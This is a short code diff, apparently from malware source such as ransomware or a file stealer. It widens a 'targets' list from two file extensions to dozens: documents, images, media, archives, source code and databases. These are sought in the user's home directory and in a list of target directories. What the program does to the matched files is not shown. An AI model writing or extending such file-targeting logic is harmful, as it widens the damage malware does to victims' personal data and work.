@@ -98,7 +98,20 @@ def main():
     home_dir = os.path.expanduser('~')
 
     # Extensions to target
-    extensions = ['.txt', '.exe']
+    extensions = [
+    '.txt', '.md', '.rtf', '.doc', '.docx', '.odt',
+    '.csv', '.json', '.xml', '.yml', '.yaml',
+    '.xls', '.xlsx', '.ods',
+    '.ppt', '.pptx', '.odp',
+    '.exe', '.bat', '.sh', '.bin', '.app',
+    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
+    '.mp4', '.avi', '.mov', '.wmv', '.flv', '.mkv',
+    '.mp3', '.wav', '.aac', '.flac', '.ogg', '.m4a',
+    '.zip', '.rar', '.7z', '.tar.gz', '.tar.bz2',
+    '.py', '.js', '.java', '.c', '.cpp', '.cs', '.rb', '.php', '.html', '.htm', '.css',
+    '.db', '.sql', '.sqlite', '.mdb',
+    '.pdf', '.epub', '.mobi'
+]
 
     # Directories to target
     user_dirs = [
